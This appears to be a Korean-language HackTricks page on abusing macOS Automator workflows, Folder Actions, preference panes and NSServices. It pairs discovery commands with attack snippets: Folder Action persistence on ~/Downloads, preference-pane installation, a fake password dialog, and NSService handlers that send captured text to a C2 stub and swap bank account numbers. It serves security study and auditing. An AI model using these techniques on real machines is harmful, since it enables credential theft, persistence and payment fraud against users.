# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### 기본 정보

**Automator**는 macOS의 시각적 자동화 도구입니다. **workflows**(`.workflow` bundles)를 실행하며, 이는 **actions**(`.action` bundles)로 구성됩니다. Automator는 또한 **Folder Actions**, **Quick Actions**, 그리고 **Shortcuts** 통합을 구동합니다. 최신 macOS에서는 workflows를 **Shortcuts로 import**할 수도 있어, 같은 악성 로직이 Finder Quick Action, `~/Library/Services/` 아래의 user service, 또는 legacy Automator actions를 사용하는 shortcut으로 나타날 수 있습니다.

Automator actions는 workflow가 실행될 때 Automator runtime에 로드되는 **plugins**입니다. 이들은 다음을 할 수 있습니다:
- arbitrary shell scripts 실행
- 파일과 데이터 처리
- AppleScript를 통해 애플리케이션과 상호작용
- 복잡한 automation을 위해 함께 연결

### 이 내용이 중요한 이유

> [!WARNING]
> Automator workflows는 **social-engineered**되어 실행될 수 있습니다 — 단순한 문서 파일처럼 보이기 때문입니다. `.workflow` bundle에는 workflow가 실행될 때 동작하는 embedded shell commands가 포함될 수 있습니다. Folder Actions와 결합되면, 파일 이벤트에서 트리거되는 **automatic persistence**를 제공합니다. 최근 Gatekeeper 수정 사항도 **app-bundled Quick Actions**(`Contents/PlugIns/*.workflow`)를 무해한 데이터가 아니라 실행 가능한 콘텐츠로 취급해야 함을 보여주었습니다.

### 발견하기
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 공격: Social-Engineered Workflow

`.workflow` 번들은 대부분의 사용자에게 일반 문서 파일처럼 보입니다:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### 공격: Folder Action Persistence

Folder Actions는 파일이 모니터링되는 폴더에 추가될 때 자동으로 workflow를 실행합니다:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions는 재부팅 후에도 유지되며 조용히 실행됩니다. `~/Downloads`의 Folder Action은 **다운로드된 모든 파일이 페이로드를 트리거한다는 뜻**입니다 — Safari, Chrome, AirDrop, 이메일 첨부파일을 포함합니다. 또한 `System Events`는 기본 `~/Library/Scripts/Folder Action Scripts` 위치 밖의 스크립트를 가리키는 Folder Actions를 등록할 수 있으므로, 느슨한 경로 검색이 유용합니다. 관련 TCC 영향은 [the TCC page](../macos-security-protections/macos-tcc/README.md)를 확인하세요.

---

## Preference Panes

### Basic Information

Preference panes(`.prefPane` 번들)는 **System Settings**(이전의 System Preferences)에서 로드되는 플러그인입니다. 시스템 또는 서드파티 기능을 위한 설정 UI 패널을 제공합니다. 오래된 시스템에서는 `System Preferences`가 직접 로드했으며; 최신 릴리스에서는 서드파티 pane이 보통 System Settings에서 시작되는 **legacy loader XPC service**를 통해 중계됩니다.

### Why This Matters

- Preference panes는 System Settings / System Preferences가 스폰한 **trusted host process**에서 실행됩니다
- 최신 시스템에서 그 host는 **`legacyLoader` XPC service**일 수 있으므로, 중요한 경계는 여전히 **trusted Apple UI process -> third-party code loading**입니다
- 서드파티 preference panes는 해당 UI에 연결된 **host process security context**와 사용자 신뢰를 상속합니다
- 사용자는 preference panes를 **double-clicking**으로 설치합니다 — 쉬운 사회공학 대상입니다
- 설치 후에는 **persist**하며 해당 panel이 열릴 때마다 System Settings가 로드합니다

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

악성 preference pane은 **pane host의** 보안 컨텍스트를 상속합니다(과거에는 `System Preferences`, 최신 버전에서는 종종 `System Settings`에 의해 실행되는 `legacyLoader` helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 공격: 설치를 통한 Persistence
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### 공격: UI Phishing

preference pane는 합법적인 시스템 UI 패널을 모방하여 **자격 증명을 피싱**할 수 있습니다:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices**는 애플리케이션이 **Services menu**(오른쪽 클릭 → Services)를 통해 다른 앱에 기능을 제공할 수 있게 합니다. 사용자가 텍스트나 데이터를 선택한 뒤 서비스를 호출하면, 선택된 데이터가 처리용으로 **service provider**에 전송됩니다.

Services는 애플리케이션의 `Info.plist`에서 `NSServices` 키 아래 선언되며 pasteboard server(`pbs`)에 등록됩니다. macOS는 또한 어떤 서비스가 표시되는지와 sandboxed 호출자에게 추가 경고를 보여줄지 결정하는 **service cache**와 **restriction policy**를 유지합니다.

### Why This Matters

- Services는 **cross-application data flow**를 받습니다 — 어떤 애플리케이션에서든 선택한 텍스트가 service로 전송됩니다
- 악성 service는 password managers, email clients, financial apps의 데이터를 가로챌 수 있습니다
- Services는 호출 애플리케이션에 **수정된 데이터**를 반환할 수 있습니다(선택 작업에서 man-in-the-middle)
- Service 이름은 합법적으로 보이도록 만들 수 있습니다("Format Text", "Encrypt Selection", "Share")
- 선택적 `NSRestricted` 플래그는 보안상 중요합니다: unrestricted로 표시된 service는 macOS가 escape-prone services에 대해 표시하는 경고 없이 sandboxed app에서 호출될 수 있습니다

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: 데이터 가로채기 서비스
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### 공격: 데이터 수정 (Man-in-the-Middle)

서비스는 합법적인 기능을 제공하는 것처럼 보이면서도 **반환되는 데이터를 수정**할 수 있습니다:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple는 각 서비스 정의마다 선택적인 `NSRestricted` boolean을 지원합니다. 이것이 설정되면, macOS는 sandbox된 호출자에게 경고합니다. 해당 서비스가 sandbox 또는 privacy 경계를 **탈출**하는 데 도움이 될 수 있기 때문입니다. 공격적 관점에서 이는 두 가지 유용한 감사 경로를 제공합니다:

- Apple Events, file access, 또는 다른 privileged actions를 프록시하는데도 **restricted로 표시되지 않은 third-party services**를 찾기
- 강한 entitlements를 가진 **고가치 built-in services**를 찾고(예: Script Editor 또는 Finder-backed helpers가 노출한 서비스), user interaction만으로 이를 data-access primitive로 바꿀 수 있는지 확인하기

좋은 최근 예시는 **CVE-2022-48574**로, Services 메커니즘이 악용되어 **기대된 confirmation flow 없이 TCC-protected user files**에 도달할 수 있었습니다. 이 버그는 수정되었지만, 이 기법은 threat modeling에 여전히 유용합니다. file access 또는 automation requests를 호출자를 대신해 전달하는 서비스라면 모두 같은 수준으로 검토해야 합니다.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple은 2024년에 app-bundled Automator Quick Action이 normal assessment 없이 실행될 수 있던 Gatekeeper bypass를 수정했습니다. 앱을 감사할 때는 `Contents/PlugIns/*.workflow/Contents/document.wflow`를 helper scripts나 login items를 검사하듯 정확히 살펴보세요. [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md)를 보세요.
- **Shortcuts can inherit legacy Automator behavior**: Apple은 third-party shortcuts가 **legacy Automator action**을 사용해 기대된 permission flow 없이 Apple Events를 보내는 것이 발견된 후 추가적인 user-consent prompt도 추가했습니다. Imported workflows와 shortcut bundles는 `Run AppleScript`, `Run Shell Script`, 그리고 유사한 bridge actions에 대해 검토해야 합니다. [the TCC page](../macos-security-protections/macos-tcc/README.md)를 보세요.
- **Automator is still a live privacy boundary**: Apple은 protected user data에 대한 접근을 위해 2025년에 또 다른 Automator 수정을 배포했습니다. Automator가 legacy surface라 하더라도, 어떤 workflow runner, Quick Action host, automation bridge라도 dead code가 아니라 현재의 attack surface로 취급하세요.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC 권한 상승
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → 비밀번호 관리자 탈취
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## References

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
